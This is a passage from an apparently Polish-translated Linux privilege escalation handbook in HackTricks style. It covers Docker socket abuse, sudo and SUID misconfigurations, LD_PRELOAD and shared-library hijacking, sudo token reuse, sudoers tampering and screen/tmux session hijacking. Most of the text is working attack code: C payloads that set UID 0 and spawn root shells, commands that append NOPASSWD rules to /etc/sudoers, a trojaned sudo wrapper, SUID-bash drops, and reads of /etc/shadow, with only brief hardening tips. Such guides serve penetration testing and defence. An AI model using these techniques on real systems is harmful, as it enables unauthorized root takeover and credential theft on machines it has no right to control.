```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie poleceń wewnątrz niego.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po skonfigurowaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z uprawnieniami roota do systemu plików hosta.

### Inne

Zwróć uwagę, że jeśli masz uprawnienia zapisu do Docker socket, ponieważ jesteś **w grupie `docker`**, masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź więcej sposobów na wydostanie się z dockera lub nadużycie go w celu eskalacji uprawnień w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system komunikacji międzyprocesowej (IPC), który umożliwia aplikacjom efektywną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny, wspierając podstawowe IPC, które ulepsza wymianę danych między procesami, przypominając mechanizm gniazd domeny UNIX. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, co sprzyja płynnej integracji między komponentami systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować, że odtwarzacz muzyki wyciszy dźwięk, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus wspiera system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, co upraszcza procesy, które tradycyjnie były skomplikowane.

D-Bus działa w modelu zezwalania/odmowy (allow/deny model), zarządzając uprawnieniami do wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie skumulowanego efektu pasujących reguł polityki. Polityki te określają interakcje z busem, co potencjalnie może umożliwić privilege escalation poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` jest podany, opisując uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalnie, podczas gdy polityki w kontekście "default" dotyczą wszystkich nieobjętych przez inne, bardziej specyficzne polityki.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerate i exploit komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Zawsze warto enumerate network i ustalić pozycję maszyny.

### Ogólna enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie mogłeś się komunikować przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz być w stanie przechwycić niektóre poświadczenia.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź, kim jesteś, jakie masz **uprawnienia**, jacy **użytkownicy** są w systemie, którzy z nich mogą się **zalogować** i którzy mają **uprawnienia roota:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

Niektóre wersje Linuxa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** eskalować uprawnienia. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać ci uprawnienia root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** środowiska **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego hałasu i binaria `su` oraz `timeout` są dostępne na komputerze, możesz spróbować brute-force użytkownika przy użyciu [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` także próbuje brute-force użytkowników.

## Nadużycia zapisu w PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisywać w jakimś folderze należącym do $PATH** możesz być w stanie escalate privileges poprzez **utworzenie backdoor w zapisywalnym folderze** o nazwie pewnej komendy, która zostanie wykonana przez innego użytkownika (najlepiej root) i która **nie jest ładowana z folderu znajdującego się wcześniej** niż twój zapisywalny folder w $PATH.

### SUDO and SUID

Możesz mieć uprawnienia do wykonania jakiegoś polecenia za pomocą sudo lub pliki mogą mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików lub nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja sudo może pozwolić użytkownikowi wykonać pewne polecenie z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`; łatwo jest teraz uzyskać powłokę, dodając klucz ssh do katalogu root lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania polecenia:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało na załadowanie dowolnej biblioteki python podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV zachowane przez sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać nieinteraktywne zachowanie startowe Basha, aby uruchomić dowolny kod jako root przy wywołaniu dozwolonego polecenia.

- Dlaczego to działa: Dla nieinteraktywnych powłok Bash ocenia `$BASH_ENV` i source'uje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowane przez sudo, twój plik zostanie source'owany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny target wywołujący `/bin/bash` w trybie nieinteraktywnym, lub dowolny skrypt bash).
- `BASH_ENV` obecne w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`, stosuj `env_reset`.
- Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych binarek.
- Rozważ logowanie i alertowanie I/O sudo, gdy używane są zachowane zmienne środowiskowe.

### Terraform przez sudo przy zachowanym HOME (!env_reset)

Jeśli sudo pozostawia środowisko nienaruszone (`!env_reset`) jednocześnie zezwalając na `terraform apply`, `$HOME` pozostaje katalogiem domowym użytkownika wywołującego. Terraform w związku z tym ładuje **$HOME/.terraformrc** jako root i respektuje `provider_installation.dev_overrides`.

- Wskaż wymagany provider na zapisywalny katalog i umieść złośliwy plugin o nazwie providera (np. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform nie przejdzie Go plugin handshake, ale wykona payload jako root zanim zakończy działanie, pozostawiając SUID shell.

### TF_VAR overrides + symlink validation bypass

Zmienne Terraform można podać przez zmienne środowiskowe `TF_VAR_<name>`, które przetrwają, gdy sudo zachowa środowisko. Słabe walidacje takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` można obejść za pomocą symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform rozwiązuje symlink i kopiuje rzeczywisty `/root/root.txt` do miejsca czytelnego dla atakującego. To samo podejście można wykorzystać do **zapisania** w uprzywilejowanych ścieżkach przez uprzednie utworzenie docelowych symlinków (np. wskazując ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt lub binarkę, która wywołuje polecenia bez ścieżek bezwzględnych (`free`, `df`, `ps`, etc.) oraz zapisywalny wpis w PATH, który jest przeszukiwany jako pierwszy.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo — omijanie ścieżek wykonywania
**Przejdź**, aby odczytać inne pliki lub użyj **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Jeśli przyznano użytkownikowi **sudo permission** dla pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_ można to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli binarka **suid** **uruchamia inne polecenie bez określenia ścieżki do niego (zawsze sprawdź za pomocą** _**strings**_ **zawartość dziwnej binarki SUID)**).

[Payload examples to execute.](payloads-to-execute.md)

### Binarka SUID z podaną ścieżką polecenia

Jeśli binarka **suid** **wykonuje inne polecenie, podając ścieżkę**, to możesz spróbować **export a function** o nazwie polecenia, które wywołuje plik suid.

Na przykład, jeśli binarka suid wywołuje _**/usr/sbin/service apache2 start**_ musisz spróbować utworzyć funkcję i wyeksportować ją:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wtedy, gdy wywołasz suid binary, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazania jednej lub więcej bibliotek współdzielonych (.so files), które mają zostać załadowane przez program ładujący przed wszystkimi innymi, w tym standardową biblioteką C (`libc.so`). Proces ten nazywa się wstępnym ładowaniem biblioteki.

Jednak aby utrzymać bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku **suid/sgid** plików wykonywalnych, system wymusza pewne warunki:

- Program ładujący ignoruje **LD_PRELOAD** dla programów, u których real user ID (_ruid_) nie zgadza się z effective user ID (_euid_).
- Dla plików wykonywalnych z **suid/sgid**, wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają ustawione **suid/sgid**.

Privilege escalation może nastąpić, jeśli masz możliwość uruchamiania poleceń przy użyciu `sudo` i wynik `sudo -l` zawiera zapis **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala, by zmienna środowiskowa **LD_PRELOAD** była zachowana i rozpoznawana nawet wtedy, gdy polecenia są uruchamiane z `sudo`, co potencjalnie może prowadzić do wykonania arbitrary code z elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy natrafisz na binary z uprawnieniami **SUID**, które wydają się nietypowe, warto sprawdzić, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje możliwość wykorzystania.

Aby to wykorzystać, należy utworzyć plik C, np. _"/path/to/.config/libcalc.c"_, zawierający poniższy kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu eskalację uprawnień poprzez manipulację uprawnieniami plików i uruchomienie shell z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku obiektu współdzielonego (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Ostatecznie uruchomienie dotkniętego SUID binary powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Skoro znaleźliśmy SUID binary, który ładuje bibliotekę z katalogu, do którego możemy zapisywać, utwórzmy w tym katalogu bibliotekę o odpowiedniej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi zawierać funkcję nazwaną `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to skompilowana lista binarek Unix, które mogą zostać wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) działa na tej samej zasadzie, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** do polecenia.

Projekt zbiera legalne funkcje binarek Unix, które można nadużyć, aby wydostać się z ograniczonych shelli, eskalować lub utrzymać podwyższone uprawnienia, przesyłać pliki, uruchamiać bind i reverse shelle oraz ułatwiać inne zadania post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Reużywanie tokenów sudo

W przypadkach, gdy masz **dostęp do sudo**, ale nie znasz hasła, możesz eskalować uprawnienia przez **oczekiwanie na wykonanie polecenia sudo, a następnie przejęcie tokenu sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" użył **`sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie to czas trwania tokena sudo, który pozwala używać `sudo` bez wprowadzania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` jest równe 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` poleceniem `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub na stałe modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie powyższe wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Drugi exploit** (`exploit_v2.sh`) utworzy sh shell w _/tmp_ **należący do root z setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **trzeci exploit** (`exploit_v3.sh`) **utworzy sudoers file**, który sprawi, że **sudo tokens będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **write permissions** w folderze lub na którymkolwiek z plików utworzonych w tym folderze, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **create a sudo token for a user and PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **obtain sudo privileges** bez konieczności znajomości hasła wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` i pliki w `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** dowolny plik, będziesz w stanie **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz zapisywać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD — pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zazwyczaj łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** kontekstu użytkownika (na przykład dodając nową ścieżkę w .bash_profile), tak aby gdy użytkownik uruchomi sudo, wykonywany był twój plik sudo.

Zwróć uwagę, że jeśli użytkownik korzysta z innego shell (nie bash) będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Albo uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą ładowane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

To oznacza, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie przeszukiwać katalog `/usr/local/lib` w poszukiwaniu bibliotek**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którymkolwiek z wskazanych miejsc: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, w dowolnym pliku w `/etc/ld.so.conf.d/` lub w dowolnym katalogu wskazanym w pliku konfiguracyjnym w `/etc/ld.so.conf.d/*.conf` może on być w stanie eskalować uprawnienia.\  
Sprawdź **how to exploit this misconfiguration** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, jak określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities zapewniają **podzbiór dostępnych uprawnień roota dla procesu**. To efektywnie dzieli uprawnienia roota na **mniejsze i odrębne jednostki**. Każdej z tych jednostek można następnie niezależnie przydzielić procesom. W ten sposób pełen zestaw uprawnień zostaje zredukowany, zmniejszając ryzyko wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je nadużywać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu **bit "execute"** oznacza, że dany użytkownik może **cd** do folderu.\
Bit **"read"** oznacza, że użytkownik może **wyświetlić listę** **plików**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) stanowią wtórną warstwę uprawnień dyskrecjonalnych, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do plików lub katalogów, umożliwiając przyznawanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **granularności zapewnia dokładniejsze zarządzanie dostępem**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" uprawnienia do odczytu i zapisu dla pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACLs z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte sesje shell

W **starszych wersjach** możesz **hijack** niektóre sesje **shell** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **połączyć się** tylko do screen sessions należących do **własnego użytkownika**. Jednak możesz znaleźć **interesujące informacje w sesji**.

### screen sessions hijacking

**Wyświetl listę screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Był to problem w przypadku **starych wersji tmux**. Nie byłem w stanie przejąć sesji tmux (v2.1) utworzonej przez root jako nieuprzywilejowany użytkownik.

**Wyświetl sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

